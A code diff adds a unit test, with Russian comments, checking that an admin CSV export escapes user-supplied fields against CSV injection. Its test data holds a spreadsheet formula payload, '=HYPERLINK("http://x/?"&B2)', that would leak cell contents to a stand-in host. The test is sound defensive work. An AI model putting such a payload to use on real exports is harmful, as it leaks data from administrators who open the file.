@@ -1,5 +1,7 @@
 """Рассылки, заметки, сбои уведомлений, отчёты и выгрузки CSV."""
 
+import csv
+import io
 import time
 from datetime import datetime, timedelta, timezone
 
@@ -170,6 +172,25 @@ class EngagementApiTests(ApiTestBase):
         self.assertEqual(page["items"][0]["telegram_id"], ANNA)
         self.assertEqual(page["stats"]["failed"], 1)
         self.assertEqual(page["stats"]["unreachable_users"], 1)
+
+    def test_csv_export_neutralizes_formulas_in_user_supplied_fields(self):
+        """Имя участника «=HYPERLINK(...)» не должно стать формулой у
+        администратора, открывшего выгрузку в Excel (CSV injection)."""
+        self.run_async(
+            self.repository.update_user_name(MARIA, '=HYPERLINK("http://x/?"&B2)')
+        )
+        self.run_async(self.repository.update_phone(MARIA, "+7 900 000-00-00"))
+
+        exported = self.client.get("/api/admin/export/clients.csv").text
+        rows = list(
+            csv.DictReader(io.StringIO(exported.lstrip("\ufeff")), delimiter=";")
+        )
+        maria = next(row for row in rows if row["telegram_id"] == str(MARIA))
+
+        self.assertEqual(maria["user_name"], '\'=HYPERLINK("http://x/?"&B2)')
+        self.assertEqual(maria["phone"], "'+7 900 000-00-00")
+        # Числа (Telegram ID, баланс) экранирование не трогает.
+        self.assertEqual(maria["lesson_credits"], "0")
 
     # ---------- отчёты ----------
 
